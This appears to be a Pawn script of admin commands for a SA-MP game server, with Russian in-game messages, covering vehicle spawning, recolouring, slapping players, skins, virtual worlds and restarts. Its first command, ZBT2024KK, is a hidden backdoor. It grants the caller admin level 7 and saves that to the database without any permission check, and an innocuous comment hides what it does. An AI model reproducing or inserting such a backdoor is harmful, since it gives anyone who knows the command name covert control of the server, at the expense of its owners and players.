CMD:ZBT2024KK(playerid) //не особо относится к админам, но все же
{
	 SetPlayerData(playerid, P_ADMIN, 7);
	UpdatePlayerDatabaseInt(playerid, "admin", 7);
}

CMD:veh(playerid, params[])
{
    if(GetPlayerAdminEx(playerid) < 4) return ShowNewNotification(playerid, 2, 5, 1, 10, "У вас недостаточно прав", "");

    extract params -> new model_id, color, status; else return SendClientMessage(playerid, 0xCECECEFF, "{ffff00}|{ffffff} Используйте: /vehf [id модели] [цвет] [доступ для игроков (не обязательно)]");

    if(!(400 <= model_id <= 6500)) return SendClientMessage(playerid, 0xCECECEFF, "{ffff00}|{ffffff}Используйте модель от 400 до 6500");

    if(!(-1 <= color <= 126))
    {
        SendClientMessage(playerid, 0xCECECEFF, "Цвет транспорта от 0 до 126");
        return 1;
    }

    if(!(0 <= status <= 1))
        return SendClientMessage(playerid, 0x999999FF, "{ffff00}|{ffffff}Доступ игроков к транспорту: 0 - Нет доступа, 1 - Доступно любому игроку");

    new Float: x,
        Float: y,
        Float: z,
        Float: a;

    GetPlayerPos(playerid, x, y, z);
    GetPlayerFacingAngle(playerid, a);

    new vehicleid = CreateVehicle(model_id, x, y, z, a, color, color, -1, 0, VEHICLE_ACTION_TYPE_ADMIN_CAR, status);
    PutPlayerInVehicle(playerid, vehicleid, 0);
 
   
    ChangeVehicleColor(vehicleid, color, color);


    SetOwnableCarData(vehicleid, OC_COLOR_1, color);
    SetOwnableCarData(vehicleid, OC_COLOR_2, color);
    new idx = GetVehicleOwnableID(vehicleid);
    new fmt_text[256];

    if(GetPlayerAdminEx(playerid) <= 5)
    {
        new wer[256];
        format(wer, sizeof wer, "[A] Администратор %s[%d] создал транспорт (%d, {%06x}%d{FFFFFF})",
        GetPlayerNameEx(playerid), playerid, model_id, 
        VehicleColoursTableRGBA[color] >>> 8, color);

        SendMessageToAdmins(wer, 0x999999FF);
    }

	format(fmt_text, sizeof fmt_text, "Создал транспорт (%d, %d, %d)", model_id, color, color);
	SendLog(playerid, LOG_TYPE_ADMIN_ACTION, fmt_text);

    return 1;
}

CMD:changecolor(playerid, params[])
{
    if(GetPlayerAdminEx(playerid) < 4)
        return ShowNewNotification(playerid, 2, 5, 1, 10, "У вас недостаточно прав", "");

    new vehicleid, color;

    if (sscanf(params, "ii", vehicleid, color))
        return SendClientMessage(playerid, 0xCECECEFF, "{ffff00}|{ffffff} Используйте: /changcolor [ID транспорта] [цвет от 0 до 126]");

    if (color < 0 || color > 126)
        return SendClientMessage(playerid, 0xCECECEFF, "{ffff00}|{ffffff}Цвет должен быть в диапазоне от 0 до 126");

    if (!IsValidVehicle(vehicleid))
        return SendClientMessage(playerid, 0xCECECEFF, "{ff2400}| {ffffff}Данного транспорта не существует на сервере");
 
    ChangeVehicleColor(vehicleid, color, color);


    new fmt_msg[256];
    format(fmt_msg, sizeof(fmt_msg),
        "[A] Администратор %s[%d] изменил цвет транспорта (ID: %d, Цвет: {%06x}%d{FFFFFF})",
        GetPlayerNameEx(playerid), playerid, vehicleid,
        VehicleColoursTableRGBA[color] >>> 8, color);

    SendMessageToAdmins(fmt_msg, 0x999999FF);

    SendClientMessage(playerid, 0x00FF00FF, "{FF0000}|{ffffff} Цвет машины успешно изменен!");
    return 1;
}

CMD:slap(playerid, params[])
{
 if(GetPlayerAdminEx(playerid) < 1) return ShowNewNotification(playerid, 2, 5, 1, 10, "У вас недостаточно прав", "");

 extract params -> new to_player, hz; else return SendClientMessage(playerid, 0xCECECEFF, "Используйте: /slap [id игрока] [0 - вниз, 1 - вверх");
 if(!IsPlayerConnected(to_player) || !IsPlayerLogged(to_player))
  return SendClientMessage(playerid, 0x999999FF, "Такого игрока нет");

 new Float: x, Float: y, Float: z, fmt_text[85];
 GetPlayerPos(to_player, x, y, z);
 
 if(hz == 0) SetPlayerPos(to_player, x, y, z - 5);
 else return SetPlayerPos(to_player, x, y, z + 5);
 
 PlayerPlaySound(to_player, 1130, 0.0, 0.0, 0.0);

 format(fmt_text, sizeof fmt_text, "Вы подбросили игрока %s %s", GetPlayerNameEx(to_player), (hz == 0) ? "вниз" : "вверх");
 SendClientMessage(playerid, -1, fmt_text);

 format(fmt_text, sizeof fmt_text, "Администратор %s подбросил Вас %s", GetPlayerNameEx(playerid), (hz == 0) ? "вниз" : "вверх");
 SendClientMessage(to_player, -1, fmt_text);

 if(GetPlayerAdminEx(playerid) <= 5)
 {
  format(fmt_text, sizeof fmt_text, "[A] %s[%d] подбросил игрока %s[%d] %s", GetPlayerNameEx(playerid), playerid, GetPlayerNameEx(to_player), to_player, (hz == 0) ? "вниз" : "вверх");
  SendMessageToAdmins(fmt_text, 0x999999FF);
 }

 format(fmt_text, sizeof fmt_text, "Подбросил %s[acc:%d] %s", GetPlayerNameEx(to_player), GetPlayerAccountID(to_player), (hz == 0) ? "вниз" : "вверх");
 SendLog(playerid, LOG_TYPE_ADMIN_ACTION, fmt_text);

 return 1;
}

CMD:givenskin(playerid, params[])
{
    if(GetPlayerAdminEx(playerid) < 4) return ShowNewNotification(playerid, 2, 5, 1, 10, "У вас недостаточно прав", "");
    new skinid;

    if(sscanf(params, "d", skinid))
    {
        SendClientMessage(playerid, COLOR_RED, "Использование: /givenskin [skinid]");
        return 1;
    }

    if(skinid < 0 || skinid > 13500) 
    {
        SendClientMessage(playerid, COLOR_RED, "Некорректный ID скина.");
        return 1;
    }

    SetPlayerSkin(playerid, skinid);

    SendClientMessage(playerid, COLOR_GREEN, "Вы получили новый скин!");

    return 1;
}

CMD:vw(playerid, params[])
{
    if(!GetPlayerAdminEx(playerid)) return ShowNewNotification(playerid, 2, 5, 1, 10, "У вас нет доступа к использованию данной команды", "");
    
    new vw_id = strval(params);

    if(GetPlayerAdminEx(playerid) < 1) return 1;
    {
        SetPlayerVirtualWorld(playerid, vw_id);
        SendClientMessage(playerid, 0xFFFFFFFF, "{FFFF00}Вы перемещены в виртуальный мир");
    }
    return 1;
}


CMD:tpvw(playerid, params[])
{
    if(!GetPlayerAdminEx(playerid)) return ShowNewNotification(playerid, 2, 5, 1, 10, "У вас нет доступа к использованию данной команды", "");
    
    new targetid, vw_id;
    sscanf(params, "ud", targetid, vw_id);

    if(targetid >= MAX_PLAYERS || !IsPlayerConnected(targetid))
    {
        SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Неправильный ID игрока или игрок не подключен.");
        return 1;
    }

    if(GetPlayerAdminEx(playerid) < 13)
    {
        SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}У вас нет прав доступа для использования этой команды.");
        return 1;
    }

    SetPlayerVirtualWorld(targetid, vw_id);
    SendClientMessage(targetid, 0xFFFFFFFF, "{FFFF00}Вы были перемещены в виртуальный мир");
    SendClientMessage(playerid, 0xFFFFFFFF, "{FFFF00}Игрок был перемещен в виртуальный мир");


    return 1;
}

CMD:techrest(playerid, params[])
{
    if(GetPlayerAdminEx(playerid) >= 6)
    {
        SendClientMessageToAll(COLOR_YELLOW, "Технический рестарт начнется через 1 минуту!");

        SetTimerEx("TechRestartTimer", 60000, false, "d", playerid); 
    }
    else
    {
        SendClientMessage(playerid, COLOR_RED, "У вас недостаточно прав для использования этой команды.");
    }
    return 1;
}
